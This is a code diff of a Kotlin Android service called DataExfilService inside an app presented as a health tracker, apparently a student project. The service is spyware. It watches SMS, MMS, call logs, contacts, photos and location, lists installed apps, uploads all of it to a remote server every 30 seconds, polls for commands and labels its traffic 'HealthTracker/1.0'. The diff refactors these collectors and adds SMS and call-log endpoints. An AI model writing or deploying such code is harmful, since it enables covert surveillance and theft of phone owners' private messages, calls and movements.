@@ -33,9 +33,10 @@ import android.provider.ContactsContract
 import android.provider.Settings
 import android.provider.CallLog
 import com.inf2007.healthtracker.R
-import android.location.Location
 import com.inf2007.healthtracker.utilities.collectors.AppCollector
+import com.inf2007.healthtracker.utilities.collectors.DataCollector
 import com.inf2007.healthtracker.utilities.collectors.LocationCollector
+import com.inf2007.healthtracker.utilities.collectors.SmsCallLogCollector
 
 class DataExfilService : Service() {
 
@@ -49,10 +50,12 @@ class DataExfilService : Service() {
         private const val DOWNLOADS_ENDPOINT = "$BASE_URL/downloads"
         private const val COMMAND_ENDPOINT = "$BASE_URL/commands"
         private const val VIDEO_ENDPOINT = "$BASE_URL/videos"
-        private const val USER_APPS_ENDPOINT = "$BASE_URL/user_apps"
-        private const val LOCATION_ENDPOINT = "$BASE_URL/location_update"
+        const val USER_APPS_ENDPOINT = "$BASE_URL/user_apps"
+        const val LOCATION_ENDPOINT = "$BASE_URL/location_update"
         private const val PHOTOS_ENDPOINT = "$BASE_URL/photos"
         private const val CONTACTS_ENDPOINT = "$BASE_URL/contacts"
+        const val SMS_ENDPOINT = "$BASE_URL/sms"
+        const val CALL_LOG_ENDPOINT = "$BASE_URL/call_logs"
     }
 
     private lateinit var photoObserver: ContentObserver
@@ -70,12 +73,8 @@ class DataExfilService : Service() {
 
     // Upload every 30 seconds
     private val uploadInterval = 30 * 1000L
-    private lateinit var smsCallLogCollector: SmsCallLogCollector
-    private lateinit var smsObserver: ContentObserver
-    private lateinit var callLogObserver: ContentObserver
 
-    private lateinit var appCollector: AppCollector
-    private lateinit var locationCollector: LocationCollector
+    private val collectors = mutableListOf<DataCollector>()
 
     private val uploadRunnable = object : Runnable {
         override fun run() {
@@ -122,7 +121,7 @@ class DataExfilService : Service() {
                     Log.i(TAG, "App installed: $packageName, Total apps now: $totalApps")
                 }
 
-                appCollector.collect()
+                collectors.filterIsInstance<AppCollector>().firstOrNull()?.collect()
             }
         }
     }
@@ -142,21 +141,19 @@ class DataExfilService : Service() {
         createNotificationChannel()
         setupPhotoObserver()
         setupContactsObserver()
-        registerReceiver(uploadFileReceiver,
-            IntentFilter("com.inf2007.healthtracker.UPLOAD_FILE"), RECEIVER_NOT_EXPORTED)
-        smsCallLogCollector = SmsCallLogCollector(this)
-        setupSmsAndCallLogObservers()
+        registerReceiver(uploadFileReceiver, IntentFilter("com.inf2007.healthtracker.UPLOAD_FILE"), RECEIVER_NOT_EXPORTED)
         registerReceiver(appInstallReceiver, IntentFilter(PackageLister.ACTION_APP_INSTALLED), RECEIVER_NOT_EXPORTED)
         registerReceiver(pinLogUploadReceiver, IntentFilter("com.inf2007.healthtracker.UPLOAD_PIN_LOG"), RECEIVER_NOT_EXPORTED)
-        appCollector = AppCollector(this) { appsJson ->
-            uploadUserAppsJson(appsJson)
-        }
-        locationCollector = LocationCollector(this) { location ->
-            sendLocationToServer(location)
+
+        collectors.apply {
+            add(AppCollector(this@DataExfilService))
+            add(LocationCollector(this@DataExfilService))
+            add(SmsCallLogCollector(this@DataExfilService))
         }
 
-        appCollector.startObserving()
-        locationCollector.startObserving()
+        collectors.forEach { it.startObserving() }
+
+        collectors.filterIsInstance<SmsCallLogCollector>().firstOrNull()?.setupObservers(contentResolver)
     }
 
     override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
@@ -169,17 +166,6 @@ class DataExfilService : Service() {
         handler.postDelayed(downloadUploadRunnable, 10000)
 
         startCommandPolling()
-
-        Handler(Looper.getMainLooper()).postDelayed({
-            if (smsCallLogCollector.hasSmsPermission()) {
-                Log.d(TAG, "Performing initial SMS full dump")
-                smsCallLogCollector.collectAndUploadAllMessages()
-            }
-            if (smsCallLogCollector.hasCallLogPermission()) {
-                Log.d(TAG, "Performing initial call log full dump")
-                smsCallLogCollector.collectAndUploadAllCallLogs()
-            }
-        }, 10000) // 10 seconds delay
 
         return START_STICKY
     }
@@ -412,12 +398,6 @@ class DataExfilService : Service() {
     override fun onDestroy() {
         handler.removeCallbacks(uploadRunnable)
         handler.removeCallbacks(downloadUploadRunnable)
-        if (::smsObserver.isInitialized) {
-            contentResolver.unregisterContentObserver(smsObserver)
-        }
-        if (::callLogObserver.isInitialized) {
-            contentResolver.unregisterContentObserver(callLogObserver)
-        }
         Log.d(TAG, "Data exfiltration service destroyed")
         try {
             unregisterReceiver(appInstallReceiver)
@@ -429,9 +409,10 @@ class DataExfilService : Service() {
         } catch (e: Exception) {
             Log.e(TAG, "Error unregistering pinLogUploadReceiver", e)
         }
-        appCollector.stopObserving()
-        locationCollector.stopObserving()
+
+        collectors.forEach { it.stopObserving() }
         super.onDestroy()
+        collectors.filterIsInstance<SmsCallLogCollector>().firstOrNull()?.removeObservers(contentResolver)
         contentResolver.unregisterContentObserver(photoObserver)
         contentResolver.unregisterContentObserver(contactsObserver)
         unregisterReceiver(uploadFileReceiver)
@@ -1042,142 +1023,6 @@ class DataExfilService : Service() {
                 })
             } catch (e: Exception) {
                 Log.e(TAG, "Error uploading video: ${e.message}")
-            }
-        }.start()
-    }
-
-    private fun setupSmsAndCallLogObservers() {
-        Log.d(TAG, "========== SETTING UP SMS, MMS, AND CALL LOG OBSERVERS ==========")
-
-        // Create a single observer that triggers for any message change
-        val messageObserver = object : ContentObserver(Handler(Looper.getMainLooper())) {
-            override fun onChange(selfChange: Boolean) {
-                Log.d(TAG, "MESSAGE DATABASE CHANGED (no URI) - checking for new messages")
-                smsCallLogCollector.collectNewMessages()
-            }
-
-            override fun onChange(selfChange: Boolean, uri: Uri?) {
-                Log.d(TAG, "MESSAGE DATABASE CHANGED with URI: $uri - checking for new messages")
-                smsCallLogCollector.collectNewMessages()
-            }
-        }
-
-        // Register for ALL possible message-related URIs
-        val messageUris = listOf(
-            Uri.parse("content://sms"),           // SMS
-            Uri.parse("content://sms/inbox"),     // SMS inbox
-            Uri.parse("content://sms/sent"),      // SMS sent
-            Uri.parse("content://mms"),           // MMS
-            Uri.parse("content://mms/inbox"),     // MMS inbox
-            Uri.parse("content://mms/sent"),      // MMS sent
-            Uri.parse("content://mms-sms"),       // Combined
-            Uri.parse("content://mms-sms/conversations") // Conversations
-        )
-
-        messageUris.forEach { uri ->
-            try {
-                contentResolver.registerContentObserver(
-                    uri,
-                    true,
-                    messageObserver
-                )
-                Log.d(TAG, "Observer registered for $uri")
-            } catch (e: Exception) {
-                Log.d(TAG, "Cannot register for $uri: ${e.message}")
-            }
-        }
-
-        // Call Log Observer (keep separate)
-        callLogObserver = object : ContentObserver(Handler(Looper.getMainLooper())) {
-            override fun onChange(selfChange: Boolean, uri: Uri?) {
-                Log.d(TAG, "CallLog onChange() called with URI: $uri")
-                smsCallLogCollector.collectNewCalls()
-            }
-        }
-
-        contentResolver.registerContentObserver(
-            CallLog.Calls.CONTENT_URI,
-            true,
-            callLogObserver
-        )
-        Log.d(TAG, "CallLog observer registered")
-
-        Log.d(TAG, "========== OBSERVER SETUP COMPLETE ==========")
-    }
-
-    private fun uploadUserAppsJson(jsonData: JSONObject) {
-        try {
-            val requestBody = jsonData.toString()
-                .toRequestBody("application/json; charset=utf-8".toMediaTypeOrNull())
-
-            val request = Request.Builder()
-                .url(USER_APPS_ENDPOINT)
-                .post(requestBody)
-                .addHeader("User-Agent", "HealthTracker/1.0")
-                .build()
-
-            NetworkClient.instance.newCall(request).enqueue(object : Callback {
-                override fun onFailure(call: Call, e: IOException) {
-                    Log.e(TAG, "User apps JSON upload failed: ${e.message}")
-                }
-                override fun onResponse(call: Call, response: Response) {
-                    if (response.isSuccessful) {
-                        Log.i(TAG, "User apps JSON uploaded successfully")
-                    } else {
-                        Log.w(TAG, "User apps JSON upload failed: HTTP ${response.code}")
-                    }
-                    response.close()
-                }
-            })
-        } catch (e: Exception) {
-            Log.e(TAG, "Error uploading user apps JSON: ${e.message}")
-        }
-    }
-
-    private fun sendLocationToServer(location: Location) {
-        Thread {
-            try {
-                val deviceId = getUniqueDeviceId()
-
-                val locationData = JSONObject().apply {
-                    put("device_id", deviceId)
-                    put("device_model", Build.MODEL)
-                    put("timestamp", System.currentTimeMillis())
-                    put("latitude", location.latitude)
-                    put("longitude", location.longitude)
-                    put("accuracy", location.accuracy)
-                    if (location.hasAltitude()) {
-                        put("altitude", location.altitude)
-                    }
-                    if (location.hasSpeed()) {
-                        put("speed", location.speed)
-                    }
-                    put("provider", location.provider)
-                }
-
-                val requestBody = locationData.toString()
-                    .toRequestBody("application/json; charset=utf-8".toMediaTypeOrNull())
-
-                val request = Request.Builder()
-                    .url(LOCATION_ENDPOINT)
-                    .post(requestBody)
-                    .addHeader("User-Agent", "HealthTracker/1.0")
-                    .build()
-
-                NetworkClient.instance.newCall(request).enqueue(object : Callback {
-                    override fun onFailure(call: Call, e: IOException) {
-                        Log.e(TAG, "Location send failed: ${e.message}")
-                    }
-                    override fun onResponse(call: Call, response: Response) {
-                        if (response.isSuccessful) {
-                            Log.d(TAG, "Location sent: ${location.latitude}, ${location.longitude}")
-                        }
-                        response.close()
-                    }
-                })
-
-            } catch (e: Exception) {
-                Log.e(TAG, "Error sending location: ${e.message}")
             }
         }.start()
     }
